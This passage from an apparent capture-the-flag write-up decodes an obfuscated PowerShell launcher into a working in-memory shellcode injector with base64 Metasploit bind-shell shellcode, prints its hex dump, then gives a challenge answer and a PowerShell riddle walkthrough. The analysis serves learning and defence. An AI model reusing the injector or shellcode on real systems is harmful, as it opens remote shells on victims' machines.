I7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA' '))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute = $false;
$s.RedirectStandardOutput = $true;
$s.WindowStyle = 'Hidden';
$s.CreateNoWindow = $true;
$p = [System.Diagnostics.Process]::Start($s);
</pre></table></code></div></div><p>Extract the FromBase64String, and run it through a base64 decode with:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>echo -n 'H4sIAKne010...' | base64 -d | xxd
00000000: 1f8b 0800 a9de d35d 0203 b556 6d6f da48  .......]...Vmo.H
00000010: 10fe 9c48 f90f 5685 84ad 108c 036d 9a48  ...H..V......m.H
00000020: 956e cd9b 2138 8118 cc5b d169 63af cdc2  .n..!8...[.ic...
00000030: da06 7b0d 985e fffb 8d01 a7a9 9ade b527  ..{..^.........'
00000040: 9d95 97f5 eecc eccc 33cf ccd8 897d 8bd3  ........3....}..
...
</pre></table></code></div></div><p>That is binary data and if you look up the first few bytes, you’ll find out that it is a <a href="https://www.filesignatures.net/index.php?page=search&amp;search=1F8B08&amp;mode=SIG">GZIP file</a>. You can save it into a file like so:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>echo -n 'H4sIAKne010...' | base64 -d &gt; outfile.gz
</pre></table></code></div></div><p>Then unzip the file and look at it’s contents:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>ᐅ gzip -d outfile.gz
ᐅ cat outfile
function uM1F {
         Param ($i46, $zVytt)
         $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 &lt;code&gt;    return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))&lt;/code&gt;
 }
 function nL9 {
         Param (
                 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
                 [Parameter(Position = 1)] [Type] $mVd_U = [Void]
         )
 &lt;code&gt;    $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])     $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')     $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')     return $yv.CreateType()&lt;/code&gt;
 }
[Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEIt
KPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1o
MzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnA
AAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA
+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
 $oDm = &lt;a href=":Copy"&gt;System.Runtime.InteropServices.Marshal&lt;/a&gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
 $lHZX = &lt;a href=":Copy"&gt;System.Runtime.InteropServices.Marshal&lt;/a&gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
 &lt;a href=":Copy"&gt;System.Runtime.InteropServices.Marshal&lt;/a&gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
</pre></table></code></div></div><p>This is more powershell exploit script, and there’s another base64 encoded payload. Decode it the same way as before to get another binary string.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>ᐅ echo -n '/OiCAAAAYInlMc...' | base64 -d | xxd
00000000: fce8 8200 0000 6089 e531 c064 8b50 308b  ......`..1.d.P0.
00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&amp;1..&lt;
00000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52  a|., .......RW.R
00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J&lt;.L.x.H..Q.Y
00000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac  ...I..:I.4...1..
00000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475  .....8.u..}.;}$u
00000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3  .X.X$..f..K.X...
00000070: 8b04 8b01 d089 4424 245b 5b61 595a 51ff  ......D$$[[aYZQ.
00000080: e05f 5f5a 8b12 eb8d 5d68 3332 0000 6877  .__Z....]h32..hw
00000090: 7332 5f54 684c 7726 0789 e8ff d0b8 9001  s2_ThLw&amp;........
000000a0: 0000 29c4 5450 6829 806b 00ff d56a 0a68  ..).TPh).k...j.h
000000b0: c0a8 5680 6802 0011 5c89 e650 5050 5040  ..V.h...\..PPPP@
000000c0: 5040 5068 ea0f dfe0 ffd5 976a 1056 5768  P@Ph.......j.VWh
000000d0: 99a5 7461 ffd5 85c0 740a ff4e 0875 ece8  ..ta....t..N.u..
000000e0: 6700 0000 6a00 6a04 5657 6802 d9c8 5fff  g...j.j.VWh..._.
000000f0: d583 f800 7e36 8b36 6a40 6800 1000 0056  ....~6.6j@h....V
00000100: 6a00 6858 a453 e5ff d593 536a 0056 5357  j.hX.S....Sj.VSW
00000110: 6802 d9c8 5fff d583 f800 7d28 5868 0040  h..._.....}(Xh.@
00000120: 0000 6a00 5068 0b2f 0f30 ffd5 5768 756e  ..j.Ph./.0..Whun
00000130: 4d61 ffd5 5e5e ff0c 240f 8570 ffff ffe9  Ma..^^..$..p....
00000140: 9bff ffff 01c3 29c6 75c1 c3bb e01d 2a0a  ......).u.....*.
00000150: 68a6 95bd 9dff d53c 067c 0a80 fbe0 7505  h......&lt;.|....u.
00000160: bb47 1372 6f6a 0053 ffd5
</pre></table></code></div></div><p>Looking this code up online <a href="https://samsclass.info/127/proj/p8bim.htm">shows</a> that it is a shellcode created from metasploit with <code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell\_bind\_tcp -f c</code></p><p>However, it is supremely unhelpful in solving the Objective. What a waste of time.</p><h2 id="objective-5--network-log-analysis-determine-compromised-system"><span class="mr-2">Objective 5 – Network Log Analysis: Determine Compromised System</span><a href="#objective-5--network-log-analysis-determine-compromised-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>The attacks don’t stop! Can you help identify the IP address of the malware-infected system using these <a href="https://downloads.elfu.org/elfu-zeeklogs.zip">Zeek logs</a>? _For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: 192.168.134.130</p></blockquote><p>This is another defense related objective where you have to dig through logs and find evidence of the bad guy. You can get a hint on how to analyze these logs from Sparkle Redberry in the Laboratory.</p><h3 id="terminal-challenge--xmas-cheer-laser"><span class="mr-2">Terminal Challenge – Xmas Cheer Laser</span><a href="#terminal-challenge--xmas-cheer-laser" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="/assets/img/2020/01/image-7.png"><img data-src="/assets/img/2020/01/image-7.png" data-proofer-ignore></a></p><blockquote class="wp-block-quote"><p> I&#8217;m Sparkle Redberry and Imma chargin&#8217; my laser!<br /> Problem is: the settings are off.<br /> Do you know any PowerShell?<br /> It&#8217;d be GREAT if you could hop in and recalibrate this thing.<br /> It spreads holiday cheer across the Earth …<br /> … when it&#8217;s working!</p><cite>Sparkle Redberry</cite></blockquote><p>This terminal challenge is about figuring out how to make PowerShell do what you want in order to solve riddles (a LOT of them). You’re given a PowerShell prompt that can only process PowerShell commands.</p><pre class="wp-block-preformatted">Elf University Student Research Terminal - Christmas Cheer Laser Project
The research department at Elf University is currently working on a top-secret
Laser which shoots laser beams of Christmas cheer at a range of hundreds of   
miles. The student research team was successfully able to tweak the laser to  
JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.  
Unfortunately, someone broke into the research terminal, changed the laser    
settings through the Web API and left a note behind at /home/callingcard.txt. 
Read the calling card and follow the clues to find the correct laser Settings.
Apply these correct settings to the laser using it's Web API to achieve laser 
output of 5 Mega-Jollies per liter.                                           

Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. </pre><p>The goal of this challenge is to find the correct settings to calibrate the laser with and apply them. To accomplish that, you have to answer a string of riddles that lead one to another and along the way you will see the calibration settings scattered here and there.</p><p>I’ll step through the riddles and their solutions and highlight the calibration settings. At the end I’ll point out which setting was found at which riddle.</p><h4 id="riddle-1--callingcardtxt"><span class="mr-2">Riddle 1 – callingcard.txt</span><a href="#riddle-1--callingcardtxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>A clue to this riddle was given in the banner text, “/home/callingcard.txt” and this is how to read it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-Content /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
</pre></table></code></div></div><p>Since the riddle mentions history, use “Get-History” command to retrieve the command line history.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-History

 Id CommandLine
 -- -----------
  1 Get-Help -Name Get-Process 
  2 Get-Help -Name Get-* 
  3 Set-ExecutionPolicy Unrestricted 
  4 Get-Service | ConvertTo-HTML -Property Name, Status &gt; C:\services.htm 
  5 Get-Service | Export-CSV c:\service.csv 
  6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
  7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
  8 Get-EventLog -Log "Application" 
  9 I have many name=value variables that I share to applications system wide. At a command I w…
 10 Get-Content /home/callingcard.txt
</pre></table></code></div></div><p>There’s a calibration settings in the history, along with the next riddle, at position number 9. To inspect it further, use “Get-History -ID” and “Format-List -Property” to show everything about that entry.</p><h4 id="riddle-2--environment"><span class="mr-2">Riddle 2 – Environment</span><a href="#riddle-2--environment" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-History -ID 9 | Format-List -Property *

Id                 : 9
CommandLine        : I have many name=value variables that I share to applications system wide. 
                     At a command I will reveal my secrets once you Get my Child Items.
ExecutionStatus    : Completed
StartExecutionTime : 11/29/19 4:57:16 PM
EndExecutionTime   : 11/29/19 4:57:16 PM
Duration           : 00:00:00.6090308
</pre></table></code></div></div><p>The riddle mentions name=value variables, and that is referring to environment variables. To see them, use the command <code class="language-plaintext highlighter-rouge">Get-ChildItems env:</code> and it requires the colon at the end.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-ChildItem env:

Name                           Value
----                           -----
_                              /bin/su
DOTNET_SYSTEM_GLOBALIZATION_I… false
HOME                           /home/elf
HOSTNAME                       040650f40b8e
LANG                           en_US.UTF-8
LC_ALL                         en_US.UTF-8
LOGNAME                        elf
MAIL                           /var/mail/elf
PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/s…
PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnaly…
PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/share/powers…
PWD                            /home/elf
RESOURCE_ID                    79d5b2ca-1002-4fa7-9d84-dd93e1585089
riddle                         Squeezed and compressed I am hidden away. Expand me from my priso…
SHELL                          /home/elf/elf
SHLVL                          1
TERM                           xterm
USER                           elf
USERDOMAIN                     laserterminal
userdomain                     laserterminal
username                       elf
USERNAME                       elf
</pre></table></code></div></div><p>The next riddle is the “riddle” variable. Use the command <code class="language-plaintext highlighter-rouge">Get-Content env:riddle</code> to see the whole thing.</p><h4 id="riddle-3--recurse-etc"><span class="mr-2">Riddle 3 – Recurse /etc/</span><a href="#riddle-3--recurse-etc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-Content env:riddle
Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.
</pre></table></code></div></div><p>The riddle tells us to go through all the files and folders of /etc and find the newest file. Use the command <code class="language-plaintext highlighter-rouge">cd /etc; Get-ChildItem -Recurse | Sort-Object -Property LastWriteTime</code>. That will change to the /etc directory, then get all the files and folders with <code class="language-plaintext highlighter-rouge">Get-ChildItem</code>, then it sorts them based on the property <code class="language-plaintext highlighter-rouge">LastWriteTime</code>.</p><p>It will show five files that have a newer date than the rest.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>Directory: /etc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          12/13/19  5:16 PM            575 group-
------          12/13/19  5:16 PM            476 gshadow-
--r---          12/13/19  5:16 PM            581 group
------          12/13/19  5:16 PM            482 gshadow
-----l           1/10/20  9:47 PM             12 mtab
--r---           1/10/20  9:47 PM            174 hosts
--r---           1/10/20  9:47 PM            113 resolv.conf
--r---           1/10/20  9:47 PM             13 hostname

    Directory: /etc/apt

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---           1/10/20  9:47 PM        5662902 archive
</pre></table></code></div></div><p>The most interesting one is “archive”. To see what’s inside, use the command <code class="language-plaintext highlighter-rouge">Expand-Archive -Path apt/archive -DestinationPath '/home/elf/archive/'</code>. Then go back to the home directory and look at the archive folder.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>PS /etc&gt; cd /home/elf; Get-ChildItem archive


    Directory: /home/elf/archive

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----           1/10/20  9:53 PM                refraction
</pre></table></code></div></div><p>There’s another folder called ‘refraction’. Go to that directory and use Get-ChildItem to list its contents.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS /home/elf&gt; cd archive/refraction
PS /home/elf/archive/refraction&gt; Get-ChildItem


    Directory: /home/elf/archive/refraction

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf
</pre></table></code></div></div><p>The “runme.elf” file is clearly a binary file if you try to get it’s contents, so to run it you have to change it’s mode properties. You can actually use a few standard bash shell commands here, and “chmod” is one of them.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS /home/elf/archive/refraction&gt; chmod +x runme.elf
PS /home/elf/archive/refraction&gt; ./runme.elf       
refraction?val=1.867
</pre></table></code></div></div><p>That program prints out another one of the laser values. The other file in that directory is the next riddle.</p><h4 id="riddle-4--md5-hash-search"><span class="mr-2">Riddle 4 – md5 Hash Search</span><a href="#riddle-4--md5-hash-search" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS /home/elf/archive/refraction&gt; Get-Content riddle
Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

25520151A320B5B0D21561F92C8F6224
</pre></table></code></div></div><p>Following clues in this riddle, look at all the files and directories within /home/elf.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PS /home/elf/archive/refraction&gt; cd 
PS /home/elf&gt; Get-ChildItem


    Directory: /home/elf

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----           1/11/20  3:28 AM                archive
d-r---          12/13/19  5:15 PM                depths
--r---          12/13/19  4:29 PM           2029 motd
</pre></table></code></div></div><p>The “depths” directory matches clues in the riddle, so search in there for a file with the md5 hash of “25520151A320B5B0D21561F92C8F6224”. To do so will require a couple lines of commands. You can use shortcuts for common PowerShell cmdlets such as “gci” for “Get-ChildItem”.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>PS /home/elf&gt; gci -File -Recurse -Depth 2 -Path 'depths' | Get-FileHash -Algorith MD5 | Format-List &gt; out.txt 
PS /home/elf&gt; gc out.txt | Select-String -Pattern "25520151A320B5B0D21561F92C8F6224" -SimpleMatch -Context 1,1

  Algorithm : MD5
&gt; Hash      : 25520151A320B5B0D21561F92C8F6224
  Path      : /home/elf/depths/produce/thhy5hll.txt
</pre></table></code></div></div><p>The discovered file gives you another laser parameter value and the next riddle.</p><h4 id="riddle-5--deepest-directory"><span class="mr-2">Riddle 5 – Deepest Directory</span><a href="#riddle-5--deepest-directory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS /home/elf&gt; gc /home/elf/depths/produce/thhy5hll.txt
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
</pre></table></code></div></div><p>The PowerShell code to solve this riddle’s clue is kind of complex:<br /> First recursively list out directory contents of “depths”.<br /> Second, Select the objects’ full pathname and calculate the length of the paths.<br /> Third, sort against the calculated length and display the output.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>PS /home/elf&gt; gci "./*" -File -Recurse -Path "depths" | select-object FullName, @{Name="Nlength";Expression={$_.FullName.Length}} | sort-object Nlength | Format-List
...
FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/v
           ote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefo
           re/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end
           /accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/
           accident/labor/sail/dropped/fox/0jhj5xz6.txt
Nlength  : 388
</pre></table></code></div></div><p>Dump the contents of the file to see the next riddle.</p><h4 id="riddle-6--kill-their-jobs"><span class="mr-2">Riddle 6 – Kill their Jobs</span><a href="#riddle-6--kill-their-jobs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS /home/elf&gt; gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

bushy
alabaster
minty
holly

Do this for me and then you /shall/see .
</pre></table></code></div></div><p>In this riddle, you have to list processes by owner and kill those in a certain order.<br /> First, use the command <code class="language-plaintext highlighter-rouge">Get-Process -IncludeUserName</code> to list those jobs.<br /> Second, use <code class="language-plaintext highlighter-rouge">Stop-Process -ID -Force</code> to kill processes by their ID.<br /> If you kill the processes in the correct order, you will get the next riddle in a file called <code class="language-plaintext highlighter-rouge">/home/elf/shall/see</code></p><h4 id="riddle-7--event-log-ids"><span class="mr-2">Riddle 7 – Event Log ID’s</span><a href="#riddle-7--event-log-ids" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS /home/elf&gt; Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will 
be in the Properties of the lonely unique event Id.
</pre></table></code></div></div><p>This riddle wants you to parse through an EventLog and group events by Id. The solution will involve the event that is in its own group.</p><p>To solve this riddle, first, find the XML file in “/etc” using the command <code class="language-plaintext highlighter-rouge">Get-ChildItem -Recurse -Path "/etc/" -Include "*.xml"</code>.<br /> Second, change to the directory of the file that was found to make the rest easier, <code class="language-plaintext highlighter-rouge">cd /etc/systemd/system/timers.target.wants/</code>.<br /> Third, use <code class="language-plaintext highlighter-rouge">Select-String -Path ./EventLog.xml -Pattern ‘N=”Id”&gt;(.*)&lt;‘ -AllMatches</code> to parse the event log for matches to the specified regular expression. That will collect all the event id’s since they begin with ‘&lt;I32 N=”Id”&gt;’ tag. To verify that you can dump the contents of EventLog.xml and look for some of the described tags. Pipe the matches into a “Group-Object” command by their value, using <code class="language-plaintext highlighter-rouge">| % {$_.matches.groups[1].value} | Group-Object</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS /etc/systemd/system/timers.target.wants&gt; Select-String -Path ./EventLog.xml -Pattern 'N="Id"&gt;(.*)&lt;' -AllMatches | % {$_.matches.groups[1].value} | Group-Object

Count Name                      Group
----- ----                      -----
    1 1                         {1}
   39 2                         {2, 2, 2, 2…}
  179 3                         {3, 3, 3, 3…}
    2 4                         {4, 4}
  905 5                         {5, 5, 5, 5…}
   98 6                         {6, 6, 6, 6…}
</pre></table></code></div></div><p>The EventID that is all alone is “1”. Search for it in the file with a command like <code class="language-plaintext highlighter-rouge">Select-String -Path ./EventLog.xml -Pattern ‘N=”id”&gt;1&lt;‘ -Context 8,200</code> and look for soemthing interesting in its Properties. You should find the last laser parameter needed.</p><h4 id="parameters"><span class="mr-2">Parameters</span><a href="#parameters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>First, get information about the API using the command included in the bannertext of the terminal challenge. It shows how to set the variables needed to calibrate the laser.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
